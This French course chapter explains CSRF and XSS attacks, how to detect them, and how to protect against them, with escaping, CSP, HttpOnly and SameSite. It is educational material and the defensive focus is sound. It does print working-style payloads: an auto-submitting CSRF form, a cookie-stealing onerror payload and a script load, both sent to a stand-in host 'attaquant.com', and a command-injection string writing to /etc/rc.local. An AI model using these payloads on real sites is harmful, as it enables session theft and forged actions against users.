# Chapitre 3 -- XSS et CSRF

> Source : 2026 CSRF XSS.pdf
> Objectif : comprendre les attaques XSS et CSRF, leurs mecanismes, et les protections

---

## 3.1 CSRF -- Cross-Site Request Forgery

### Concept

Le CSRF (prononce "sea-surf") est une attaque ou l'attaquant force le navigateur de la victime a executer une action non desiree sur un site ou elle est authentifiee.

### Principe fondamental

```
La victime est connectee (authentifiee) sur le site cible.
L'attaquant lui fait visiter une page malicieuse.
Cette page envoie automatiquement une requete au site cible.
Le navigateur de la victime joint automatiquement ses cookies d'authentification.
Le site cible execute la requete en pensant qu'elle vient de la victime.
```

### Schema d'attaque CSRF (methode GET)

```
Victime (connectee a target.com)      Site malicieux         target.com
     |                                     |                      |
     |  Visite la page malicieuse          |                      |
     |------------------------------------>|                      |
     |                                     |                      |
     |  Page contient: <img src=            |                      |
     |  "http://target.com/action?param=X"> |                      |
     |                                     |                      |
     |  Le navigateur charge l'image       |                      |
     |  (avec les cookies de target.com)   |                      |
     |--------------------------------------------------->|
     |                                     |              |
     |                                     |   Action     |
     |                                     |   executee ! |
```

### Exemple concret (GET)

**Cas normal :** changer la cle WPA du routeur
```
http://192.168.0.1/WPA.php?key=91B8A3
```

**Attaque CSRF :** l'attaquant force le changement de cle
```
http://192.168.0.1/WPA.php?key=00DEAD
```

L'attaquant integre ce lien dans une page web (par exemple via une balise image), et quand la victime la visite, son navigateur execute la requete.

Autre exemple classique : forcer un logout
```
http://target.com/logout.php
```

### Exemple concret (POST)

**Cas normal :**
```http
POST /change/key HTTP/1.1
Host: target.com
Content-Type: ...
Cookie: session=...

key=91B8A3
```

**Attaque CSRF via formulaire cache :**
```html
<form action="https://target.com/change/key" method="POST">
    <input type="hidden" name="key" value="00DEAD" />
</form>
<script>document.forms[0].submit();</script>
```

La page malicieuse contient un formulaire invisible qui se soumet automatiquement au chargement de la page.

### Protections contre le CSRF

```
Protection CSRF
    |
    +-- MEILLEURE : SameSite=Strict pour les cookies d'authentification
    |       (le navigateur n'envoie pas le cookie si la requete
    |        vient d'un autre site)
    |
    +-- BONNE : Token anti-CSRF
    |       (valeur aleatoire dans le formulaire, inconnue de l'attaquant)
    |
    +-- COMPLEMENT : Verifier l'en-tete Referer/Origin
```

**Token anti-CSRF :** le serveur genere une valeur aleatoire unique par session/formulaire et la place dans un champ cache. L'attaquant ne peut pas predire cette valeur, donc ne peut pas forger un formulaire valide.

---

## 3.2 XSS -- Cross-Site Scripting

### Concept

Le XSS est une injection de code (generalement JavaScript) dans une page web qui sera executee par le navigateur d'un autre utilisateur.

### Difference fondamentale avec les autres injections

```
Injection SQL    --> l'attaquant injecte dans la BASE DE DONNEES
Injection CMD    --> l'attaquant injecte dans le SYSTEME D'EXPLOITATION
XSS              --> l'attaquant injecte dans la SORTIE WEB (HTML/JS)
                     c'est une injection dans le OUTPUT
```

### Modele d'attaque XSS

```
                  Serveur web vulnerable
                         |
          Attaquant ---->|----> Victime
          (injecte       |      (execute le
           du code)      |       code injecte)

Points cles :
- La victime est le navigateur d'un utilisateur legitime
- L'attaque PASSE PAR un serveur web vulnerable
- La cible n'est generalement PAS le serveur web lui-meme
```

### Cas d'usage typique

- Voler le cookie de session d'un utilisateur legitime
- Idealement, l'utilisateur est admin/debug/root
- Rediriger l'utilisateur vers un site de phishing
- Modifier le contenu de la page affichee

### Mecanisme : la confiance abusee

```
Navigateur                 Serveur Web
    |                          |
    |  Le navigateur FAIT      |
    |  CONFIANCE a ce que      |
    |  le serveur envoie       |
    |                          |
    |  Si le serveur envoie    |
    |  du JavaScript, le       |
    |  navigateur l'execute    |
    |                          |

L'attaquant essaie de MODIFIER (controler) ce que le serveur envoie :
    - Via une valeur stockee (commentaire, profil)
    - Via une valeur refletee (parametre de recherche)
    - Via le DOM
```

### Types de XSS

```
XSS
 |
 +-- XSS Reflete (Reflected)
 |       Le code malicieux est dans l'URL/requete
 |       Le serveur le "reflete" dans la reponse
 |       Necessite que la victime clique sur un lien
 |
 +-- XSS Stocke (Stored)
 |       Le code malicieux est stocke sur le serveur
 |       (dans un commentaire, un profil, une BDD)
 |       Toute personne visitant la page est touchee
 |
 +-- XSS DOM-based
         Le code malicieux modifie le DOM directement
         cote client, sans passer par le serveur
```

### Canal initial de l'injection

L'injection XSS peut etre initiee par :
- Une requete GET ou POST
- D'autres canaux (XCS -- Cross-Channel Scripting)
- Une injection SQL (le code JS est stocke en BDD)
- Meme une injection de commande

---

## 3.3 Trouver des XSS

### Tests de detection

**Phase 1 : Tests bienveillants pour identifier le contexte**
```html
<b>aaa</b>
<PLAINTEXT>
<p style="color:red">test</p>
```

Si le texte apparait en gras, en texte brut, ou en rouge, le HTML est interprete (pas echappe).

**Phase 2 : Tests de code executable**
```
http://.../search?query=<script>alert('xss')</script>
```

```html
<a href="javascript:alert('XSS')">xss</a>
<img src="0" onerror=alert(document.cookie);>
<img onerror=alert('xss') src="xss">
```

Si une boite d'alerte apparait, la XSS est confirmee.

### Techniques de contournement

Les attaquants varient les ecritures pour contourner les filtres :
```html
<SCRipt>alert(42)</SCRipt>          (casse mixte)
<img src=1>                         (sans guillemets)
'';!--"<XSS>=&{()}                  (test de caracteres speciaux)
```

---

## 3.4 Exploitation d'une XSS

### Vol de cookie (methode classique)

```html
<img src="0" onerror="window.location='http://attaquant.com/get.php?cookie='+document.cookie;">
```

Quand la victime visite la page contenant ce code, son navigateur :
1. Essaie de charger l'image (source invalide `"0"`)
2. Declenche l'evenement `onerror`
3. Redirige vers le serveur de l'attaquant en passant le cookie en parametre

### Chargement de code distant

```html
<SCRIPT SRC=http://attaquant.com/evil.js></SCRIPT>
```

Permet de charger un script complet depuis le serveur de l'attaquant, offrant des possibilites d'attaque beaucoup plus elaborees.

---

## 3.5 Protections contre XSS

### Principe fondamental

> **Never trust an output!**
> Ne jamais faire confiance aux donnees envoyees au navigateur.

(En SQL c'etait "never trust an input" -- ici c'est l'inverse : on protege la SORTIE.)

### Protection 1 : Echapper les caracteres sensibles

La reference : **OWASP XSS Prevention Cheat Sheet**

| Caractere | Remplacement |
|-----------|-------------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `/` | `&#x2F;` |

### Protection 2 : Fonctions d'echappement du langage

**PHP : `htmlspecialchars`**
```php
<?php
$new = htmlspecialchars(
    "<script href='test'>Test</a>",
    ENT_QUOTES  // pour convertir aussi les apostrophes
);
echo $new;
// Sortie: &lt;script&gt;alert=&#039;test&#039;&gt;Test&lt;/a&gt;
?>
```

```php
<?php
$pseudo = htmlspecialchars($_POST['name']);
echo "Hello " . $pseudo . " !";
?>
```

**Python : `cgi.escape`**
```python
import cgi
# Attention : n'echappe que &, < et >
s = cgi.escape("& < >")

# Pour une protection complete :
html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;"
}

def html_escape(text):
    return "".join(html_escape_table.get(c, c) for c in text)
```

### Protection 3 : Content Security Policy (CSP)

La CSP est un en-tete HTTP qui controle quelles ressources le navigateur peut charger :

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```

Fonctionnalites :
- Definir les sources de JavaScript autorisees
- Desactiver les balises `<script>` inline
- Autoriser uniquement les `<script>` avec un nonce valide
- Desactiver les URLs `javascript:`

Reference : [MDN CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)

### Protection 4 : Flag HttpOnly sur les cookies

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Le flag `HttpOnly` empeche JavaScript d'acceder au cookie via `document.cookie`. Meme si une XSS est exploitee, le cookie de session ne peut pas etre vole par cette methode.

### Protection 5 : Tainting (marquage)

Technique systematique :
1. Prefixer toutes les entrees utilisateur avec un tag (ex: `"usi-"`)
2. Marquer toutes les variables intermediaires qui dependent d'entrees utilisateur avec `"usi-"`
3. Echapper et verifier systematiquement toutes les sorties marquees `"usi-"`

### Hierarchie des protections XSS

```
Meilleure protection
    |
    v
1. CSP stricte (disable inline, nonce-based)
2. Echapper systematiquement TOUTES les sorties
3. HttpOnly + Secure + SameSite sur les cookies
4. Tainting / marquage des variables
5. Validation des entrees (complement, pas suffisant seul)
    |
    v
Protection minimale
```

---

## 3.6 Comparaison XSS vs CSRF

| Aspect | XSS | CSRF |
|--------|-----|------|
| **Cible** | Le navigateur de la victime | Le serveur via le navigateur de la victime |
| **Mecanisme** | Injection de code dans la page | Forcer une requete authentifiee |
| **Necessite** | Site vulnerable aux injections | Victime authentifiee sur le site |
| **Code execute** | Oui (JavaScript) | Non (juste une requete HTTP) |
| **Protection principale** | Echapper les sorties + CSP | Token anti-CSRF + SameSite |
| **Principe** | "Never trust an output" | "Verifier l'origine de la requete" |

---

## 3.7 Exemples de DS

### Identifier les types d'attaque (Sujet 2025, Question 1.1)

```
/search="<SCRipt>alert(42)</SCRipt>"                --> XSS
/stuff.php?id=42 UNION SELECT 1, 1, null -          --> SQL
/test.php?traceroute="|| echo reboot > /etc/rc.local" --> CMD
/set.php?WifiKey=ABC123                              --> CSRF
/scripts/admin.php.bak                               --> INFO
/images/lo%67o.png                                   --> INFO
```

**Methode pour identifier :**
- Presence de `<script>`, `<img onerror`, `alert(` --> XSS
- Presence de `UNION`, `SELECT`, `OR 1=1`, `'--` --> SQL
- Presence de `;`, `|`, `&&`, commandes shell --> CMD
- URL d'action sur un parametre sensible sans protection --> CSRF
- Requete d'exploration sans code malicieux --> INFO

---

## 3.8 Pieges courants

1. **Confondre XSS et CSRF** : XSS injecte du code, CSRF forge une requete
2. **Penser que la validation des entrees suffit contre XSS** : il faut AUSSI echapper les sorties
3. **Oublier `ENT_QUOTES` dans `htmlspecialchars`** : sans ce flag, les apostrophes ne sont pas echappees
4. **Penser que HttpOnly protege contre toute XSS** : il empeche le vol de cookie mais l'attaquant peut quand meme modifier la page, rediriger l'utilisateur, etc.
5. **Confondre XSS reflete et stocke** : le stocke est plus dangereux car il touche tous les visiteurs
6. **Ignorer CSP** : c'est la protection la plus efficace contre les XSS modernes

---

## 3.9 Recapitulatif

```
XSS ET CSRF
    |
    +-- CSRF :
    |       +-- Forge une requete au nom de la victime
    |       +-- Protection : SameSite=Strict, token anti-CSRF
    |
    +-- XSS :
            +-- Injecte du code (JS) dans la sortie web
            +-- 3 types : reflete, stocke, DOM-based
            +-- Exploitation : vol de cookie, redirection, keylogger
            +-- Protection :
                    +-- Echapper les sorties (&lt; &gt; &amp; &quot;)
                    +-- CSP (Content Security Policy)
                    +-- HttpOnly cookie flag
                    +-- Tainting des variables
```
